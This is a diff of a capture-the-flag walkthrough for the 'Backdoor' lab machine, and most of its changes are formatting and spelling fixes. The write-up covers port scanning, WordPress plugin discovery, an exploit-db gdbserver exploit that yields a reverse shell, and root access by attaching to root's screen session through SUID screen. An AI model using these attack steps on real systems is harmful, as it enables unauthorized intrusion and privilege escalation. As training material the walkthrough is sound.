@@ -8,11 +8,10 @@ categories:
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
 |   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
@@ -23,15 +22,13 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-generator: WordPress 5.8.1
 |_http-title: Backdoor &#8211; Real-Life
 |_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-
 ```
 
-### ffuf
-```
+
+```bash
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -47,7 +44,7 @@ xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
 
 The website is powered by `wordpress`...always good to know
 
-```
+```html
 <meta name="generator" content="WordPress 5.8.1" />
 <link rel="canonical" href="http://backdoor.htb/" />
 <link rel='shortlink' href='http://backdoor.htb/' />
@@ -55,17 +52,17 @@ The website is powered by `wordpress`...always good to know
 
 When clicking on home button it points to `backdoor.htb` so I add it to `/etc/hosts`
 
-wich make me look for potential vhosts and subdomains but nah...
+which make me look for potential vhosts and subdomains but nah...
 
 when visiting the pages found with the fuzzer we notice with have access to `wp-content`
 
-try to access he `plugins` direcory at `/wp-content/plugins/` 
+try to access he `plugins` directory at `/wp-content/plugins/`
 
 there is a single plugin installed :
 
 `ebook-download`
 
-```
+```php
 === Plugin Name ===
 Contributors: zedna
 Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
@@ -86,13 +83,14 @@ ye no it was not "simple"...I was stuck here for days
 
 went to the forums and SEEMS LIKE I MISSED A PORT???
 
-ran nmap again...again...aggressive mode ad all but I could not get it 
+ran nmap again...again...aggressive mode ad all but I could not get it
 
 analyzed that specific port and it was filtered? resetting the machine didnt help
 
 Did that later and wtf?
-```
-└──╼ $nmap backdoor.htb -p 1337            
+
+```bash
+└──╼ $nmap backdoor.htb -p 1337
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 16:08 WAT
 Nmap scan report for backdoor.htb (10.10.11.125)
 Host is up (0.13s latency).
@@ -102,11 +100,11 @@ PORT     STATE SERVICE
 ```
 Anyway long story short we get an exploit for `gdb-server` on exploit-db
 
-we run it and get access. 
+we run it and get access.
 
-Hey don't ask me I am confused too XD 
+Hey don't ask me I am confused too XD
 
-```
+```bash
 └──╼ $python 50539.py 10.10.11.125:1337 rev.bin
 [+] Connected to target. Preparing exploit
 [+] Found x64 arch
@@ -114,14 +112,15 @@ Hey don't ask me I am confused too XD
 [*] Pwned!! Check your listener
 ```
 
-```
+```bash
 cat user.txt
 ```
 
 ## privilege escalation
 
 `sudo -l` would not work...how about `suid`?
-```
+
+```bash
 user@Backdoor:/home/user$ find / -perm -u=s 2> /dev/null
 find / -perm -u=s 2> /dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -146,7 +145,7 @@ what is `screen`?
 
 Gtfobins say...well...I know this one but not with SUID
 
-```
+```bash
 user@Backdoor:/home/user$ screen -h
 screen -h
 Use: screen [-opts] [cmd [args]]
@@ -191,12 +190,12 @@ Options:
 
 hmm...okay
 
-```
+```bash
 export TERM=xterm
 screen -x root/root
 ```
 
-```
+```bash
 root@Backdoor:~# cat root.txt
 cat root.txt
 ```
